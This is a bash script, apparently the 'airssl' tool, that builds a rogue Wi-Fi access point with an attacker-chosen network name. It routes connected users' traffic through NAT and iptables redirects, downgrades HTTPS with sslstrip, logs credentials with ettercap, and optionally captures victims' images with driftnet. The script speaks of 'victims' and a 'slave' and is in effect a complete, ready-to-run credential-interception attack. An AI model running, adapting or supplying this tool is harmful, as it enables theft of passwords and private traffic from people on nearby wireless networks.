#!/bin/bash

route -n -A inet | grep UG
echo
echo
echo "Gateway IP address: "
read -e gatewayip
echo
echo -n "Interface Internet: "
read -e internet_interface
echo -n "Interface Wireless: "
read -e fakeap_interface
echo -n "Enter the ESSID: "
read -e ESSID
fakeap=$fakeap_interface

echo "Installing DHCP Server"
apt-get update
apt-get install isc-dhcp-server

mkdir -p "/pentest/wireless/airssl"

# Dhcpd creation

echo "INTERFACESv4="\"at0\"";
authoritative;
option domain-name "\"USRobotics\"";
option domain-name-servers 8.8.8.8, 8.8.4.4;

default-lease-time 600;
max-lease-time 7200;

ddns-update-style none;

subnet 10.0.0.0 netmask 255.255.255.0 {
range 10.0.0.50 10.0.0.100; 
option subnet-mask 255.255.255.0;
option broadcast-address 10.0.0.255;
option routers 10.0.0.1;
}" > /etc/dhcp/dhcpd.conf


# Fake AP
echo "[+] Starting FakeAP..."
xterm -geometry 75x15+1+0 -T "FakeAP - $fakeap - $fakeap_interface" -e airbase-ng -c 1 -e "$ESSID" $fakeap_interface & fakeapid=$!
sleep 2


# Tables
echo "[+] Configuring NAT and iptables"
ifconfig lo up
ifconfig at0 up &
sleep 1
ifconfig at0 10.0.0.1 netmask 255.255.255.0
ifconfig at0 mtu 1400
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p udp -j DNAT --to $gatewayip
iptables -P FORWARD ACCEPT
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface $internet_interface -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000


# DHCP
echo "[+] Starting DHCP..."
dhcpd -cf /etc/dhcp/dhcpd.conf
sleep 3

# Sslstrip
echo "[+] Starting sslstrip..."
xterm -geometry 75x15+1+200 -T sslstrip -e sslstrip -f -p -k 10000 & sslstripid=$!
sleep 2

# Ettercap
echo
echo "[+] Starting ettercap..."
xterm -geometry 73x25+1+300 -T ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w /pentest/wireless/airssl/passwords -i at0 & ettercapid=$!
sleep 1

# Driftnet
echo
echo "[+] Driftnet?"
echo
echo "Would you also like to start driftnet to capture the victims images,
(this may make the network a little slower), "
echo "Y or N "
read DRIFT

if [ $DRIFT = "y" ] ; then
mkdir -p "/pentest/wireless/airssl/driftnetdata"
echo "[+] Starting driftnet..."
driftnet -i $internet_interface -p -d /pentest/wireless/airssl/driftnetdata & dritnetid=$!
sleep 3
fi

xterm -geometry 75x15+1+600 -T SSLStrip-Log -e tail -f sslstrip.log & sslstriplogid=$!

clear
echo
echo "[+] Activated..."
echo "Airssl is now running, after slave connects and surfs their credentials will be displayed in ettercap. You may use right/left mouse buttons to scroll up/down ettercaps xterm shell, ettercap will also save its output to /pentest/wireless/airssl/passwords unless you stated otherwise. Driftnet images will be saved to /pentest/wireless/airssl/driftftnetdata "
echo
echo "[+] IMPORTANT..."
echo "After you have finished please close airssl and clean up properly by hitting Y,
if airssl is not closed properly ERRORS WILL OCCUR "
read WISH

# Clean up
if [ $WISH = "y" ] ; then
echo
echo "[+] Cleaning up airssl and resetting iptables..."

kill ${fakeapid}
kill ${dchpid}
kill ${sslstripid}
kill ${ettercapid}
kill ${dritnetid}
kill ${sslstriplogid}

airmon-ng stop $fakeap_interface
airmon-ng stop $fakeap
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

echo "[+] Clean up successful..."
echo "[+] Thank you for using airssl, Good Bye..."
exit

fi
exit
